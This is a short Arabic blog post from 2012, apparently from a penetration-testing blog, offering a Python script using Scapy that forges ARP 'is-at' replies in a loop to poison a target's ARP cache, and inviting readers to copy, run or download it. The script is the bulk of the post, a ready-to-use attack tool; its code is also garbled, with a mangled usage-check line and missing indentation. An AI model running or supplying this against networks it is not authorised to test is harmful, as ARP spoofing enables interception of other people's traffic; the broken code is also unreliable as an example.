---
title: "سكربت بسيط لعمل ARP Spoofing"
date: 2012-12-14 22:16:49 -0500
categories: ["Development", "PenTest", "Software/Tools"]
tags: ["ARP", "ARP-Poisoner", "ARP-Spoofing", "Poison", "Python", "Scapy", "Spoof", "Spoofing"]
permalink: "/2012/12/14/arp-spoofing-script/"
reading_time: 1
---

سكربت بسيط لعمل [ARP Spoofing](http://en.wikipedia.org/wiki/ARP_spoofing) … قم بنسخ الكود وتشغيله او تحميله من صفحة المشاريع ([هنا](/assets/files/2012/projects.bin.bin)) …

```
#!/usr/bin/env python
import sys, time
from scapy.all import sendp, ARP, Ether

if len (sys.argv)   "
print "./arpSpoofer.py eth0 192.168.1.56 192.168.1.100"	
sys.exit (1)

networkInterface = str(sys.argv[1])
targetIPAddr = sys.argv[2]
spoofedIPAddr = sys.argv[3]

# Assembling the Spoofed Packet
spoofedPacket = Ether() / ARP(pdst=targetIPAddr, psrc=spoofedIPAddr, op="is-at")

# Start Spoofing (aka Poisoning) :)
while True:
sendp(spoofedPacket, iface=networkInterface)
time.sleep (1)
```

المزيد من التجارب في الطريق إن شاء الله :)
